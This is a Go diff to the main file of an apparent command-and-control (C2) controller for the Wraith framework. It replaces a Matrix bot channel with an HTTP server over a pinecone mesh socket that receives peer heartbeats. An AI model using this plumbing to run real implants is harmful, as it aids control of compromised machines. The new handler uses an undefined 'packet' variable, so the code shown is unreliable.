@@ -3,9 +3,13 @@ package main
 import (
 	"context"
 	"crypto/ed25519"
+	"crypto/tls"
 	"encoding/hex"
 	"fmt"
+	"io"
 	"log"
+	"net"
+	"net/http"
 	"os"
 	"os/signal"
 	"strings"
@@ -16,6 +20,7 @@ import (
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/radio"
+	"github.com/gorilla/mux"
 	_ "github.com/mattn/go-sqlite3"
 )
 
@@ -53,16 +58,16 @@ func main() {
 	// Get a struct for managing pinecone connections.
 	pr := radio.GetInstance()
 
-	pr.SetPineconeIdentity(pineconeId)
+	pr.PineconeIdentity = pineconeId
 	if c.LogPinecone {
-		pr.SetLogger(log.Default())
+		pr.Logger = log.Default()
 	}
-	pr.SetInboundAddr(c.PineconeInboundTcpAddr)
-	pr.SetWebserverAddr(c.PineconeInboundWebAddr)
-	pr.SetWebserverDebugPath(c.PineconeDebugEndpoint)
-	pr.SetUseMulticast(c.PineconeUseMulticast)
+	pr.InboundAddr = c.PineconeInboundTcpAddr
+	pr.WebserverAddr = c.PineconeInboundWebAddr
+	pr.WebserverDebugPath = c.PineconeDebugEndpoint
+	pr.UseMulticast = c.PineconeUseMulticast
 	if c.PineconeStaticPeers != "" {
-		pr.SetStaticPeers(strings.Split(c.PineconeStaticPeers, ","))
+		pr.StaticPeers = strings.Split(c.PineconeStaticPeers, ",")
 	}
 
 	//
@@ -83,28 +88,59 @@ func main() {
 	ctx, ctxcancel := context.WithCancel(context.Background())
 
 	// Start pinecone.
-	go pr.Start()
+	pSocket := pr.Start()
 
-	// Set up Matrix comms for C2.
-	matrixBotCtx, stopMatrixBot := context.WithCancel(context.Background())
-	var matrixBotWait sync.WaitGroup
-	client := MatrixBotInit(matrixBotCtx, c, &matrixBotWait)
-	MatrixBotRunStartup(client, c)
-	MatrixBotEventHandlerSetUp(lib.CommandContext{
-		Context:    ctx,
-		Config:     &c,
-		Client:     client,
-		Radio:      &pr,
-		State:      s,
-		OwnPrivKey: pineconeId,
+	// Set up pinecone HTTP server.
+	wg := sync.WaitGroup{}
+
+	pMux := mux.NewRouter().SkipClean(true).UseEncodedPath()
+	pMux.Path(proto.ROUTE_PREFIX + proto.ROUTE_REG).HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		peerPublicKey, err := hex.DecodeString(r.RemoteAddr)
+		if err != nil {
+			// This shouldn't happen, but if the peer public key is
+			// malformed then we have no choice but to ignore the
+			// packet.
+			w.WriteHeader(http.StatusBadRequest)
+			return
+		}
+
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			return
+		}
+
+		packetData := proto.PacketHeartbeat{}
+		err = proto.Unmarshal(&packetData, peerPublicKey, body)
+		if err != nil {
+			// The packet data is malformed, there is nothing more we
+			// can do.
+			w.WriteHeader(http.StatusBadRequest)
+			return
+		}
+
+		go s.Heartbeat(packet.Peer, packetData)
 	})
 
-	client.JoinedRooms()
+	pineconeHttpServer := http.Server{
+		Addr:         ":0",
+		TLSNextProto: map[string]func(*http.Server, *tls.Conn, http.Handler){},
+		ReadTimeout:  10 * time.Second,
+		WriteTimeout: 10 * time.Second,
+		IdleTimeout:  60 * time.Second,
+		BaseContext: func(_ net.Listener) context.Context {
+			return ctx
+		},
+		Handler: pMux,
+	}
 
-	// Start receiving Wraith messages.
-	// Background context is okay because the channel will be closed
-	// when the manager exits further down anyway.
-	recv := pr.RecvChan(context.Background())
+	// Start pinecone HTTP server in goroutine.
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+
+		pineconeHttpServer.Serve(pSocket)
+	}()
 
 mainloop:
 	for {
@@ -115,36 +151,6 @@ mainloop:
 		// Clean up state.
 		case <-time.After(lib.STATE_CLEANUP_INTERVAL):
 			s.Prune()
-		// Process incoming packets.
-		case packet := <-recv:
-			peerPublicKey, err := hex.DecodeString(packet.Peer)
-			if err != nil {
-				// This shouldn't happen, but if the peer public key is
-				// malformed then we have no choice but to ignore the
-				// packet.
-				continue mainloop
-			}
-
-			switch packet.Route {
-			case proto.ROUTE_HEARTBEAT:
-				packetData := proto.PacketHeartbeat{}
-				err = proto.Unmarshal(&packetData, peerPublicKey, packet.Data)
-				if err != nil {
-					// The packet data is malformed, there is nothing more we
-					// can do.
-					continue mainloop
-				}
-				go s.Heartbeat(packet.Peer, packetData)
-			case proto.ROUTE_RR:
-				packetData := proto.PacketRR{}
-				err = proto.Unmarshal(&packetData, peerPublicKey, packet.Data)
-				if err != nil {
-					// The packet data is malformed, there is nothing more we
-					// can do.
-					continue mainloop
-				}
-				go s.Response(packet.Peer, packetData)
-			}
 		}
 	}
 
@@ -163,13 +169,16 @@ mainloop:
 	// Stop any ongoing operations using this context.
 	ctxcancel()
 
+	// Tear down pinecone HTTP server.
+	phttpShutdownTimeoutCtx, phttpShutdownTimeoutCtxCancel := context.WithTimeout(context.Background(), time.Second*2)
+	pineconeHttpServer.Shutdown(phttpShutdownTimeoutCtx)
+	phttpShutdownTimeoutCtxCancel()
+
 	// Stop pinecone.
 	pr.Stop()
 
-	// Stop Matrix bot.
-	stopMatrixBot()
-	matrixBotWait.Wait()
-	client.Logout()
+	// Wait for goroutines to quit.
+	wg.Wait()
 
 	os.Exit(0)
 }
